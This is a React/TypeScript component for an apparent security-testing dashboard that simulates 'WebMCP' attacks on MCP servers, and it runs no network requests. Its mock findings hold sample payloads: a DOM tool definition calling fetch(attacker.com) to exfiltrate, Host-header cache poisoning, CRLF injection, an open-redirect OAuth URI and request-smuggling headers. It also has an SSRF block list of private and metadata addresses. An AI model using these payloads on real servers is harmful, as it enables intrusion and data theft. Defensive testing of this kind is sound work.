/**
 * File: PlaybooksComposite.tsx
 * Purpose: Composite panel for all playbook-style testing: Custom Playbooks,
 *          Protocol Fuzzing, Agentic Testing, and WebMCP Testing.
 *          Extracted from AdversarialLab during Testing UX Consolidation.
 * Story: Testing UX Consolidation — Phase 3
 */

'use client'

import { useState, useCallback, useRef, useEffect } from 'react'
import { cn } from '@/lib/utils'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import {
  BookOpen,
  Zap,
  Bot,
  Globe,
  Shield,
  Swords,
  Activity,
  Lock,
  X,
  AlertTriangle,
  CheckCircle2,
} from 'lucide-react'
import { PlaybookRunner } from './PlaybookRunner'
import { ProtocolFuzzPanel } from '../scanner/ProtocolFuzzPanel'
import { AgenticLab } from '../agentic/AgenticLab'

// ---------------------------------------------------------------------------
// WebMCP Types & Config (relocated from AdversarialLab)
// ---------------------------------------------------------------------------

type WebMcpTransport = 'http' | 'sse' | 'websocket'

const WEBMCP_CATEGORIES = [
  { id: 'web-poison', label: 'Web Poisoning', count: 10 },
  { id: 'browser-tool', label: 'Browser Tool Injection', count: 10 },
  { id: 'oauth', label: 'OAuth Hijacking', count: 8 },
  { id: 'cors', label: 'CORS Exploitation', count: 6 },
  { id: 'content-type', label: 'Content-Type Confusion', count: 5 },
  { id: 'chunked', label: 'Chunked Encoding', count: 5 },
  { id: 'ws-hijack', label: 'WebSocket Hijacking', count: 5 },
] as const

type WebMcpCategoryId = typeof WEBMCP_CATEGORIES[number]['id']

interface WebMcpFinding {
  id: string
  category: string
  severity: 'low' | 'medium' | 'high' | 'critical'
  title: string
  description: string
  evidence: string
}

/** SSRF validation — blocks RFC1918, localhost, link-local, cloud metadata IPs */
function isUrlSafe(url: string): { safe: boolean; reason?: string } {
  try {
    const parsed = new URL(url)
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return { safe: false, reason: 'Only HTTP/HTTPS protocols allowed' }
    }
    const host = parsed.hostname.toLowerCase()
    if (host === 'localhost' || host === '127.0.0.1' || host === '::1' || host === '[::1]' || host === '0.0.0.0') {
      return { safe: false, reason: 'Localhost addresses blocked' }
    }
    const bare = host.replace(/^\[|\]$/g, '')
    if (/^(0+:){1,7}0*1$/.test(bare) || /^::ffff:(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(bare)) {
      return { safe: false, reason: 'IPv6-encoded private address blocked' }
    }
    if (/^0x[0-9a-f]+$/i.test(host)) {
      const num = parseInt(host, 16)
      if ((num >>> 24) === 127 || (num >>> 24) === 10) {
        return { safe: false, reason: 'Hex-encoded private IP blocked' }
      }
    }
    if (/^10\./.test(host)) return { safe: false, reason: 'Private IP (10.x) blocked' }
    if (/^172\.(1[6-9]|2\d|3[01])\./.test(host)) return { safe: false, reason: 'Private IP (172.16-31.x) blocked' }
    if (/^192\.168\./.test(host)) return { safe: false, reason: 'Private IP (192.168.x) blocked' }
    if (host === '169.254.169.254' || host.endsWith('.internal')) return { safe: false, reason: 'Cloud metadata endpoint blocked' }
    if (/^169\.254\./.test(host)) return { safe: false, reason: 'Link-local address blocked' }
    return { safe: true }
  } catch {
    return { safe: false, reason: 'Invalid URL format' }
  }
}

/** Generate mock WebMCP findings for selected categories */
function generateMockFindings(categories: WebMcpCategoryId[], transport: WebMcpTransport): WebMcpFinding[] {
  const findings: WebMcpFinding[] = []
  const severities: Array<'low' | 'medium' | 'high' | 'critical'> = ['low', 'medium', 'high', 'critical']
  const mockData: Record<string, Array<{ title: string; desc: string; evidence: string; sev: number }>> = {
    'web-poison': [
      { title: 'Cache poisoning via Host header', desc: 'MCP endpoint accepts arbitrary Host headers allowing cache key manipulation.', evidence: 'Host: attacker.com\\r\\nX-Forwarded-Host: attacker.com', sev: 2 },
      { title: 'Response splitting in tool output', desc: 'Tool response content allows CRLF injection enabling HTTP response splitting.', evidence: 'Content-Type: text/html\\r\\n\\r\\n<script>/*injected*/</script>', sev: 3 },
    ],
    'browser-tool': [
      { title: 'DOM-based tool injection', desc: 'Browser automation tool processes unsanitized DOM content containing MCP tool definitions.', evidence: '<div data-mcp-tool="exfiltrate" data-action="fetch(attacker.com)">', sev: 3 },
      { title: 'Service worker interception', desc: 'Malicious service worker intercepts MCP HTTP transport messages.', evidence: 'navigator.serviceWorker.register("/sw-intercept.js")', sev: 2 },
    ],
    'oauth': [
      { title: 'Authorization code interception', desc: 'MCP OAuth flow vulnerable to authorization code interception via open redirect.', evidence: 'redirect_uri=https://mcp.example.com/callback/../../../attacker.com', sev: 3 },
      { title: 'Token scope escalation', desc: 'Requested OAuth scopes exceed declared MCP server capabilities.', evidence: 'scope=mcp:tools:* mcp:resources:* mcp:sampling:*', sev: 2 },
    ],
    'cors': [
      { title: 'Wildcard CORS with credentials', desc: 'MCP endpoint returns Access-Control-Allow-Origin: * with credentials flag.', evidence: 'Access-Control-Allow-Origin: *\\nAccess-Control-Allow-Credentials: true', sev: 2 },
      { title: 'Origin reflection without validation', desc: 'Server reflects Origin header without allowlist validation.', evidence: 'Origin: https://evil.com -> Access-Control-Allow-Origin: https://evil.com', sev: 1 },
    ],
    'content-type': [
      { title: 'MIME type confusion', desc: 'MCP server accepts text/html when application/json expected, enabling polyglot payloads.', evidence: 'Content-Type: text/html\\n\\n{"jsonrpc":"2.0","method":"tools/call"}', sev: 1 },
    ],
    'chunked': [
      { title: 'Request smuggling via chunked encoding', desc: 'MCP HTTP transport vulnerable to request smuggling via conflicting Content-Length and Transfer-Encoding.', evidence: 'Transfer-Encoding: chunked\\nContent-Length: 42', sev: 3 },
    ],
    'ws-hijack': [
      { title: 'WebSocket upgrade hijacking', desc: 'MCP WebSocket endpoint does not validate Origin during upgrade handshake.', evidence: 'Origin: https://attacker.com\\nUpgrade: websocket\\nConnection: Upgrade', sev: 2 },
    ],
  }

  for (const catId of categories) {
    const catFindings = mockData[catId]
    if (!catFindings) continue
    for (const f of catFindings) {
      findings.push({
        id: `${catId}-${findings.length}`,
        category: WEBMCP_CATEGORIES.find(c => c.id === catId)?.label ?? catId,
        severity: severities[f.sev],
        title: `[${transport.toUpperCase()}] ${f.title}`,
        description: f.desc,
        evidence: f.evidence,
      })
    }
  }
  return findings
}

// ---------------------------------------------------------------------------
// Available models for agentic lab
// ---------------------------------------------------------------------------

const AVAILABLE_MODELS = [
  { id: 'gpt-4o', name: 'GPT-4o' },
  { id: 'gpt-4o-mini', name: 'GPT-4o Mini' },
  { id: 'claude-sonnet-4-20250514', name: 'Claude Sonnet 4' },
  { id: 'claude-haiku-4-5-20251001', name: 'Claude Haiku 4.5' },
  { id: 'llama-3.1-8b', name: 'Llama 3.1 8B' },
  { id: 'gemini-2.0-flash', name: 'Gemini 2.0 Flash' },
] as const

// ---------------------------------------------------------------------------
// Sub-panel type
// ---------------------------------------------------------------------------

type PlaybookPanel = 'custom' | 'protocol-fuzz' | 'agentic' | 'webmcp'

const PANELS: ReadonlyArray<{ id: PlaybookPanel; label: string; icon: typeof BookOpen }> = [
  { id: 'custom', label: 'Custom', icon: BookOpen },
  { id: 'protocol-fuzz', label: 'Protocol Fuzz', icon: Zap },
  { id: 'agentic', label: 'Agentic', icon: Bot },
  { id: 'webmcp', label: 'WebMCP', icon: Globe },
]

// ---------------------------------------------------------------------------
// Component
// ---------------------------------------------------------------------------

export function PlaybooksComposite() {
  const [activePanel, setActivePanel] = useState<PlaybookPanel>('custom')

  // WebMCP state (relocated from AdversarialLab)
  const [wmcpTargetUrl, setWmcpTargetUrl] = useState('')
  const [wmcpTransport, setWmcpTransport] = useState<WebMcpTransport>('http')
  const [wmcpCategories, setWmcpCategories] = useState<Set<WebMcpCategoryId>>(new Set())
  const [wmcpIsExecuting, setWmcpIsExecuting] = useState(false)
  const [wmcpShowConsent, setWmcpShowConsent] = useState(false)
  const [wmcpResults, setWmcpResults] = useState<WebMcpFinding[]>([])
  const [wmcpUrlError, setWmcpUrlError] = useState<string | null>(null)
  const wmcpTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  const handleWmcpToggleCategory = useCallback((catId: WebMcpCategoryId) => {
    setWmcpCategories(prev => {
      const next = new Set(prev)
      if (next.has(catId)) next.delete(catId)
      else next.add(catId)
      return next
    })
  }, [])

  const handleWmcpUrlChange = useCallback((url: string) => {
    setWmcpTargetUrl(url)
    if (url.trim()) {
      const validation = isUrlSafe(url)
      setWmcpUrlError(validation.safe ? null : (validation.reason ?? 'Invalid URL'))
    } else {
      setWmcpUrlError(null)
    }
  }, [])

  const handleWmcpRequestExecute = useCallback(() => {
    if (!wmcpTargetUrl.trim() || wmcpUrlError || wmcpCategories.size === 0) return
    setWmcpShowConsent(true)
  }, [wmcpTargetUrl, wmcpUrlError, wmcpCategories.size])

  const handleWmcpConfirmExecute = useCallback(() => {
    setWmcpShowConsent(false)
    setWmcpIsExecuting(true)
    setWmcpResults([])
    if (wmcpTimerRef.current) clearTimeout(wmcpTimerRef.current)
    wmcpTimerRef.current = setTimeout(() => {
      wmcpTimerRef.current = null
      const findings = generateMockFindings(Array.from(wmcpCategories), wmcpTransport)
      setWmcpResults(findings)
      setWmcpIsExecuting(false)
    }, 1500)
  }, [wmcpCategories, wmcpTransport])

  const handleWmcpCancelConsent = useCallback(() => {
    setWmcpShowConsent(false)
  }, [])

  useEffect(() => {
    return () => {
      if (wmcpTimerRef.current) clearTimeout(wmcpTimerRef.current)
    }
  }, [])

  return (
    <div className="space-y-4">
      {/* Sub-panel pill switcher */}
      <div className="flex flex-wrap gap-1.5 p-1 bg-muted/50 rounded-lg w-fit">
        {PANELS.map(({ id, label, icon: Icon }) => (
          <button
            key={id}
            onClick={() => setActivePanel(id)}
            className={cn(
              'flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium rounded-md',
              'transition-colors min-h-[36px]',
              activePanel === id
                ? 'bg-[var(--background)] text-[var(--foreground)] shadow-sm'
                : 'text-muted-foreground hover:text-[var(--foreground)] hover:bg-[var(--bg-tertiary)]',
            )}
          >
            <Icon className="h-3.5 w-3.5" aria-hidden="true" />
            {label}
          </button>
        ))}
      </div>

      {/* Panel content */}
      {activePanel === 'custom' && <PlaybookRunner />}
      {activePanel === 'protocol-fuzz' && <ProtocolFuzzPanel />}
      {activePanel === 'agentic' && (
        <AgenticLab
          availableModels={AVAILABLE_MODELS.map((model) => ({
            id: model.id,
            name: model.name,
          }))}
        />
      )}
      {activePanel === 'webmcp' && (
        <div className="space-y-4">
          <div className="flex items-center gap-2 mb-3">
            <Globe className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
            <h3 className="text-sm font-semibold text-[var(--foreground)]">
              WebMCP Attack Testing
            </h3>
            <Badge variant="outline" className="ml-auto text-xs">
              {WEBMCP_CATEGORIES.reduce((sum, c) => sum + c.count, 0)} vectors
            </Badge>
          </div>

          {/* Target URL Input */}
          <Card>
            <CardContent className="p-4 space-y-3">
              <div>
                <label htmlFor="wmcp-target-url" className="text-xs font-medium text-[var(--foreground)] block mb-1.5">
                  Target URL
                </label>
                <div className="flex gap-2">
                  <input
                    id="wmcp-target-url"
                    type="url"
                    value={wmcpTargetUrl}
                    onChange={(e) => handleWmcpUrlChange(e.target.value)}
                    placeholder="https://mcp-server.example.com/mcp"
                    aria-label="Target MCP server URL"
                    aria-describedby={wmcpUrlError ? 'wmcp-url-error' : undefined}
                    aria-invalid={wmcpUrlError ? true : undefined}
                    className={cn(
                      'flex-1 h-11 px-3 text-sm rounded-md border bg-[var(--bg-secondary)]',
                      'focus:outline-none focus-visible:ring-2 focus-visible:ring-[var(--ring)]',
                      'placeholder:text-muted-foreground',
                      wmcpUrlError
                        ? 'border-[var(--danger)] text-[var(--danger)]'
                        : 'border-[var(--border)]',
                    )}
                  />
                </div>
                {wmcpUrlError && (
                  <p id="wmcp-url-error" className="text-xs text-[var(--danger)] mt-1 flex items-center gap-1">
                    <AlertTriangle className="h-3 w-3 flex-shrink-0" aria-hidden="true" />
                    {wmcpUrlError}
                  </p>
                )}
              </div>

              {/* Transport Selector */}
              <div>
                <label className="text-xs font-medium text-[var(--foreground)] block mb-1.5">
                  Transport Type
                </label>
                <div className="flex gap-2" role="radiogroup" aria-label="Select WebMCP transport type">
                  {(['http', 'sse', 'websocket'] as const).map((t) => (
                    <button
                      key={t}
                      role="radio"
                      aria-checked={wmcpTransport === t}
                      aria-label={`${t.toUpperCase()} transport`}
                      onClick={() => setWmcpTransport(t)}
                      className={cn(
                        'px-3 min-h-[44px] rounded-md border text-xs font-medium',
                        'motion-safe:transition-colors motion-safe:duration-[var(--transition-normal)]',
                        'focus:outline-none focus-visible:ring-2 focus-visible:ring-[var(--ring)]',
                        wmcpTransport === t
                          ? 'border-[var(--dojo-primary)] bg-[var(--dojo-primary)]/10 text-[var(--dojo-primary)]'
                          : 'border-[var(--border)] text-muted-foreground hover:bg-[var(--bg-quaternary)]',
                      )}
                    >
                      {t.toUpperCase()}
                    </button>
                  ))}
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Attack Category Selector */}
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm flex items-center gap-2">
                <Swords className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
                Attack Categories
              </CardTitle>
            </CardHeader>
            <CardContent className="p-4 pt-0">
              <fieldset>
                <legend className="sr-only">Select attack categories to test</legend>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                  {WEBMCP_CATEGORIES.map((cat) => (
                    <label
                      key={cat.id}
                      className={cn(
                        'flex items-center gap-2 px-3 min-h-[44px] rounded-md border cursor-pointer',
                        'motion-safe:transition-colors motion-safe:duration-[var(--transition-normal)]',
                        'hover:bg-[var(--bg-quaternary)]',
                        'focus-within:ring-2 focus-within:ring-[var(--ring)]',
                        wmcpCategories.has(cat.id)
                          ? 'border-[var(--dojo-primary)] bg-[var(--dojo-primary)]/5'
                          : 'border-[var(--border)]',
                      )}
                    >
                      <input
                        type="checkbox"
                        checked={wmcpCategories.has(cat.id)}
                        onChange={() => handleWmcpToggleCategory(cat.id)}
                        aria-label={`${cat.label} (${cat.count} vectors)`}
                        className="h-4 w-4 rounded border-[var(--border)] accent-[var(--dojo-primary)]"
                      />
                      <span className="text-xs font-medium text-[var(--foreground)] flex-1">
                        {cat.label}
                      </span>
                      <Badge variant="outline" className="text-[10px] px-1.5 py-0">
                        {cat.count}
                      </Badge>
                    </label>
                  ))}
                </div>
              </fieldset>
            </CardContent>
          </Card>

          {/* Execute Button */}
          <div className="flex items-center gap-3">
            <Button
              onClick={handleWmcpRequestExecute}
              disabled={!wmcpTargetUrl.trim() || !!wmcpUrlError || wmcpCategories.size === 0 || wmcpIsExecuting}
              aria-label={wmcpIsExecuting ? 'Executing WebMCP tests' : 'Execute WebMCP attack tests'}
              className="min-h-[44px] gap-2"
            >
              {wmcpIsExecuting ? (
                <>
                  <Activity className="h-4 w-4 motion-safe:animate-spin" aria-hidden="true" />
                  Executing...
                </>
              ) : (
                <>
                  <Zap className="h-4 w-4" aria-hidden="true" />
                  Execute Tests
                </>
              )}
            </Button>
            <span className="text-xs text-muted-foreground">
              {wmcpCategories.size} of {WEBMCP_CATEGORIES.length} categories selected
            </span>
          </div>

          {/* Consent Dialog */}
          {wmcpShowConsent && (
            <div
              className="fixed inset-0 z-50 flex items-center justify-center bg-black/50"
              role="alertdialog"
              aria-modal="true"
              aria-labelledby="wmcp-consent-title"
              aria-describedby="wmcp-consent-desc"
            >
              <Card className="max-w-md w-full mx-4">
                <CardHeader className="pb-2">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-sm flex items-center gap-2" id="wmcp-consent-title">
                      <Lock className="h-4 w-4 text-[var(--warning)]" aria-hidden="true" />
                      Confirm Execution
                    </CardTitle>
                    <button
                      onClick={handleWmcpCancelConsent}
                      aria-label="Cancel execution"
                      className="h-8 w-8 flex items-center justify-center rounded-md hover:bg-[var(--bg-quaternary)] focus:outline-none focus-visible:ring-2 focus-visible:ring-[var(--ring)]"
                    >
                      <X className="h-4 w-4" aria-hidden="true" />
                    </button>
                  </div>
                </CardHeader>
                <CardContent className="p-4 pt-0 space-y-3">
                  <p id="wmcp-consent-desc" className="text-xs text-muted-foreground leading-relaxed">
                    You are about to execute {wmcpCategories.size} attack
                    {wmcpCategories.size !== 1 ? ' categories' : ' category'} against{' '}
                    <span className="font-mono text-[var(--foreground)]">{wmcpTargetUrl}</span>{' '}
                    via {wmcpTransport.toUpperCase()} transport. This will run mock attack simulations
                    locally. No actual network requests will be made to the target.
                  </p>
                  <div className="flex gap-2 justify-end">
                    <Button variant="outline" size="sm" onClick={handleWmcpCancelConsent} aria-label="Cancel and return" className="min-h-[44px]">
                      Cancel
                    </Button>
                    <Button size="sm" onClick={handleWmcpConfirmExecute} aria-label="Confirm and execute WebMCP tests" className="min-h-[44px] gap-1">
                      <CheckCircle2 className="h-3 w-3" aria-hidden="true" />
                      Confirm Execute
                    </Button>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {/* Results Area */}
          {wmcpResults.length > 0 && (
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm flex items-center gap-2">
                  <Activity className="h-4 w-4 text-muted-foreground" aria-hidden="true" />
                  Findings ({wmcpResults.length})
                </CardTitle>
              </CardHeader>
              <CardContent className="p-4 pt-0 space-y-2">
                {wmcpResults.map((finding) => {
                  const sevColors: Record<string, string> = {
                    critical: 'border-[var(--danger)] bg-[var(--danger)]/10 text-[var(--danger)]',
                    high: 'border-[var(--severity-high)] bg-[var(--severity-high)]/10 text-[var(--severity-high)]',
                    medium: 'border-[var(--warning)] bg-[var(--warning)]/10 text-[var(--warning)]',
                    low: 'border-[var(--severity-low)] bg-[var(--severity-low)]/10 text-[var(--severity-low)]',
                  }
                  return (
                    <div key={finding.id} className="border border-[var(--border)] rounded-md p-3 space-y-1.5">
                      <div className="flex items-start gap-2">
                        <Badge
                          variant="outline"
                          className={cn('text-[10px] px-1.5 py-0 flex-shrink-0 uppercase', sevColors[finding.severity])}
                        >
                          {finding.severity}
                        </Badge>
                        <div className="flex-1 min-w-0">
                          <p className="text-xs font-medium text-[var(--foreground)]">{finding.title}</p>
                          <p className="text-xs text-muted-foreground mt-0.5">{finding.description}</p>
                        </div>
                        <Badge variant="outline" className="text-[10px] px-1.5 py-0 flex-shrink-0">
                          {finding.category}
                        </Badge>
                      </div>
                      <pre className="text-[11px] font-mono bg-[var(--bg-tertiary)] rounded p-2 overflow-x-auto whitespace-pre-wrap break-all text-muted-foreground">
                        {finding.evidence}
                      </pre>
                    </div>
                  )
                })}
              </CardContent>
            </Card>
          )}
        </div>
      )}
    </div>
  )
}
